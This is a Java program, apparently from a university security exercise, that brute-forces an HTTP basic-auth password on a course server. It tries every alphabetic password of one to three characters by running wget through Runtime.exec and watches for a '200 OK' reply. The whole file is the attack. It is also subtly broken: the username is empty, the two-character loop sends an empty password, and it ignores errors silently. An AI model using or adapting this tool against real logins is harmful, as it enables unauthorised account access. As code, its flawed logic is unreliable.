






import java.*;
import java.io.*;
import java.util.*;

public class BruteForce
{

	public static void main(String[] args)    
	{
          Runtime rt = Runtime.getRuntime();
	  Process pr= null;
          char chars[] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
	  String pass;
          char temp[] = {'a','a'};
          char temp1[] = {'a','a','a'};
          char temp2[] = {'a'};

	  String f= new String();
          String resp = new String();
          int count=0;
          String success = new String();
          InputStreamReader  instre;
          BufferedReader bufread;


               for(int k=0;k<52;k++)
                {
                 temp2[0]=chars[k];
                 pass = new String(temp2);              
                 count++;              

        System.out.println("The password  tried is------->"+pass+"---and attempt is=="+count);
          
              f ="wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php";

                 
	         try
                  {
		    pr = rt.exec(f);

                    instre = new InputStreamReader(pr.getErrorStream());
                                 
                  
                    bufread = new BufferedReader(instre);

                    resp = bufread.readLine();
                    while( (resp = bufread.readLine())!= null)
			  {
                          if(resp.equals("HTTP request sent, awaiting response... 200 OK"))
                             {
                              System.out.println("Eureka!! Eureka!!! The password has been found it is:"+pass+"------ attempt:"+count);
                              System.exit(0);
                             }
			
                          }
	 	
                  }catch(java.io.IOException e){}
                }



  
            for(int j=0;j<52;j++)
              {
                for(int k=0;k<52;k++)
                {
                 temp[0]=chars[j];
                 temp[1]=chars[k];

                 pass = new String();              
                 count++;              

                 System.out.println("The password  tried is------->"+pass+"---and attempt is=="+count);
          
                f ="wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php";

                 
	         try
                  {
		    pr = rt.exec(f);

                    instre = new InputStreamReader(pr.getErrorStream());
                                 
                  
                    bufread = new BufferedReader(instre);

                    resp = bufread.readLine();
                    while( (resp = bufread.readLine())!= null)
			  {
                          if(resp.equals("HTTP request sent, awaiting response... 200 OK"))
                             {
                              System.out.println("Eureka!! Eureka!!! The password has been found it is:"+pass+"------ attempt:"+count);
                              System.exit(0);
                             }
			
                          }
	 	
                  }catch(java.io.IOException e){}
                 }
               }


     
         for(int i=0;i<52;i++)
            for(int j=0;j<52;j++)
               for(int k=0;k<52;k++)
                {
                 temp1[0]=chars[i];
                 temp1[1]=chars[j];
                 temp1[2]=chars[k];
                 pass = new String(temp1);              
                 count++;              

        System.out.println("The password  tried is------->"+pass+"---and attempt is=="+count);
          
              f ="wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php";

                 
	         try
                  {
		    pr = rt.exec(f);

                    instre = new InputStreamReader(pr.getErrorStream());
                                 
                  
                    bufread = new BufferedReader(instre);

                    resp = bufread.readLine();
                    while( (resp = bufread.readLine())!= null)
			  {
                          if(resp.equals("HTTP request sent, awaiting response... 200 OK"))
                             {
                              System.out.println("Eureka!! Eureka!!! The password has been found it is:"+pass+"------ attempt:"+count);
                              System.exit(0);
                             }
			
                          }
	 	
                  }catch(java.io.IOException e){}
                }
	
		
	}
	
	
} 
		
